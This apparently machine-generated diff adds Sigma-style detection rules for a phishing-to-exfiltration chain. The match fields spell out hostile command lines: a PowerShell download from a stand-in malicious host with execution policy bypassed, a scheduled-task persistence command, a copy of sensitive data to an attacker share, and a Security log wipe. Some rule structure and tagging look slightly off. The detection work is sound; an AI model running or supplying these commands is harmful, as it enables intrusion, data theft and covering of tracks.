@@ -1,0 +1,173 @@
+```yaml
+- title: Identify Initial Access via Email
+  id: 123e4567-e89b-12d3-a456-426614174000
+  description: Monitor for the creation of processes related to Outlook that involve email interactions, specifically for emails with subject lines containing "Invoice Attached" and attachments named "Invoice_12345.docx".
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+      dstNode.Type: "File"
+      dstNode.Name: "Invoice_12345.docx"
+  condition: selection
+  tags:
+    - T1203
+    - Initial Access
+  level: high
+---
+- title: Identify Opening of Malicious Attachment
+  id: 123e4567-e89b-12d3-a456-426614174001
+  description: Monitor for the execution of Microsoft Word when the attachment is opened, specifically looking for processes that indicate a macro is set to run automatically.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      dstNode.Type: "File"
+      dstNode.Name: "Invoice_12345.docx"
+  condition: selection
+  tags:
+    - T1203
+    - Initial Access
+  level: high
+---
+- title: Identify Execution of the Macro
+  id: 123e4567-e89b-12d3-a456-426614174002
+  description: Monitor for PowerShell commands executed via Microsoft Word macros, specifically looking for commands that download scripts from remote servers.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      dstNode.Type: "Process"
+      dstNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dstNode.Cmdline: '-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious-server.com/payload.ps1 -OutFile C:\\Users\\Public\\payload.ps1"'
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Identify Downloading of the Payload
+  id: 123e4567-e89b-12d3-a456-426614174003
+  description: Monitor for the execution of PowerShell commands that download payload scripts to the local system.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dstNode.Type: "File"
+      dstNode.Name: "C:\\Users\\Public\\payload.ps1"
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Identify Execution of the Downloaded Payload
+  id: 123e4567-e89b-12d3-a456-426614174004
+  description: Monitor for the execution of the downloaded PowerShell script, specifically looking for commands that execute the script from the local system.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dstNode.Type: "File"
+      dstNode.Name: "C:\\Users\\Public\\payload.ps1"
+      dstNode.Cmdline: '-ExecutionPolicy Bypass -File C:\\Users\\Public\\payload.ps1'
+  condition: selection
+  tags:
+    - T1203
+    - Execution
+  level: high
+---
+- title: Identify Establishing Persistence
+  id: 123e4567-e89b-12d3-a456-426614174005
+  description: Monitor for PowerShell commands that create scheduled tasks for persistence, specifically looking for commands that specify task creation with the PowerShell script.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dstNode.Type: "Process"
+      dstNode.Cmdline: 'schtasks /create /tn "MaliciousTask" /tr "powershell.exe -File C:\\Users\\Public\\payload.ps1" /sc onlogon /rl highest'
+  condition: selection
+  tags:
+    - T1053
+    - Persistence
+  level: high
+---
+- title: Identify Data Exfiltration or Lateral Movement
+  id: 123e4567-e89b-12d3-a456-426614174006
+  description: Monitor for PowerShell commands that indicate data exfiltration or lateral movement within the network, specifically looking for commands that access sensitive data and send it to an external server.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dstNode.Type: "Network"
+      dstNode.Dstaddress: "attacker-server"
+      dstNode.Port: 443
+      dstNode.Cmdline: 'Invoke-Command -ScriptBlock { Get-Content C:\\Users\\Public\\SensitiveData.txt } | Out-File \\\\attacker-server\\exfiltrated_data.txt'
+  condition: selection
+  tags:
+    - T1041
+    - Exfiltration
+  level: high
+---
+- title: Identify Cleanup and Covering Tracks
+  id: 123e4567-e89b-12d3-a456-426614174007
+  description: Monitor for PowerShell commands that clear event logs or delete evidence of execution, specifically looking for commands that indicate log clearing activities.
+  status: production
+  author: auto-generated
+  date: 2023-10-01
+  logsource:
+    category: custom
+    product: windows
+  detection:
+    selection:
+      srcNode.Type: "Process"
+      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dstNode.Type: "Process"
+      dstNode.Cmdline: 'wevtutil cl Security'
+  condition: selection
+  tags:
+    - T1070
+    - Defense Evasion
+  level: high
+```
